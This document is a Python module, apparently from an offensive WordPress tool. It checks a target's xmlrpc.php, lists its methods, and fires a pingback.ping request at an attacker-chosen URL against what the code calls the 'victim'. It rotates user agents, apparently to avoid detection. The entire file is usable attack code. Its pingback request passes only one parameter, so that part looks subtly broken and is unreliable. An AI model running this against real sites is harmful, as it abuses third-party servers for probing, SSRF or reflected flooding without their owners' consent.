import requests as rq
import random,json,os

class xmlrpc:

    def getRandomUserAgent(self) -> str:
        agents = json.load(open(f"{os.getcwd()}/service/useragents.json"))
        return "".join(agents[random.randint(1,43)])

    def createAndSendRequest(self,url) -> str:
        xmlData = """
        <?xml version="1.0" encoding="utf-8"?> 
        <methodCall> 
        <methodName>system.listMethods</methodName> 
        <params></params> 
        </methodCall>
        """

        header = {
            "User-Agent":"".join(self.getRandomUserAgent())
        }
        
        if url[-1] == "/":
            request_url = url + "xmlrpc.php"
        else:
            request_url = url + "/xmlrpc.php"
            
        xmlrpc_lookup = rq.get(request_url,headers=header).text
        if xmlrpc_lookup == "XML-RPC server accepts POST requests only.":
            print("\nBoom!.. XmlRpc Enabled on Wordpress.\n")
            ##Looking XMLRpc Methods
            xmlrpc_methods_checks = rq.post(request_url,headers=header,data=xmlData).text
            print(f"XmlRPC Methods Check Complete - All Methods Listed \n {xmlrpc_methods_checks}")
            if "<value><string>pingback.ping</string></value>" in xmlrpc_methods_checks:
                print("Hint: You can try out the XMLRpc ping back feature. Use -X 'pingback_url' option.")
        else:
            print("Sad Story :( - XmlRPC Failed")

    def testXMLRPCPingback(self,wp_url,pingback_url):
        xml_data = f"""
            <?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
            <param>
            <value><string>{pingback_url}</string></value>
            </param>
            </params>
            </methodCall>
        """
        header = {
            "User-Agent":"".join(self.getRandomUserAgent())
        }
        
        if wp_url[-1] == "/":
            req_url = wp_url + "xmlrpc.php"
        else:
            req_url = wp_url + "/xmlrpc.php"
        
        victim_response = rq.post(req_url,headers=header,data=xml_data)
        if victim_response.status_code == 200:
            print("\nVictim Returned statuscode -> 200!")
            print(f"Victim Response -> {victim_response.text}")
        else:
            print("Pingback Failed.!")
